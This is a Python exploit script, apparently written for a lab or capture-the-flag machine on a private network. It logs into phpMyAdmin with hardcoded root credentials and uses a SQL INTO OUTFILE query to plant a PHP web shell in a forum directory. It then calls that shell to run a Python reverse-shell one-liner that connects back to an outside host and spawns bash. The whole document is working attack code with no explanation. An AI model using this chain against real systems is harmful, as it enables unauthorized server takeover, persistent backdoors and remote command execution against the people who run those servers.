#! /usr/bin/env python3
import requests
from pwn import *
import re
import sys

requests.packages.urllib3.disable_warnings() 
s = requests.Session()
ret = s.post("https://192.168.1.22/phpmyadmin/index.php", verify=False, data={'pma_username': 'root', 'pma_password': "Fg-'kKXBj87E:aJ$"})
rx = re.compile(r'^src=\"main.php\?token=(.*)&amp;.*')
for line in ret.text.split():
    token = rx.match(line)
    if token:
        break
token = token.group(1)
print("Token:", token)

sql_inject = "SELECT 1, '<?php system($_GET[\"cmd\"].\" 2>&1\"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'"

data = {
    'is_js_confirmed': 0,
    'token': token,
    'pos': 0,
    'goto': 'server_sql.php',
    'message_to_show': 'Your+SQL+query+has+been+executed+successfully',
    'prev_sql_query': None,
    'sql_query': sql_inject,
    'bkm_label': None,
    'sql_delimiter': '%3B',
    'show_query': 1,
    'ajax_request': "true"
    }
ret = s.post("https://192.168.1.22/phpmyadmin/import.php", data=data)
ret = ret.json()
if ret['success'] == False:
    print("PhpMyAdmin SQL injection fail: ", ret['error'])
    if ret['error'] != "<div class=\"error\">#1086 - File \'/var/www/forum/templates_c/backdoor.php\' already exists</div>":
        sys.exit(1)

# Test the backdoor
ret = requests.get("https://192.168.1.22/forum/templates_c/backdoor.php", verify=False)
if not ret.ok:
    print("Backdoor is not good")
    sys.exit(1)

# Inject the reverse shell
ret = requests.get('https://192.168.1.22/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.47%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27', verify=False)
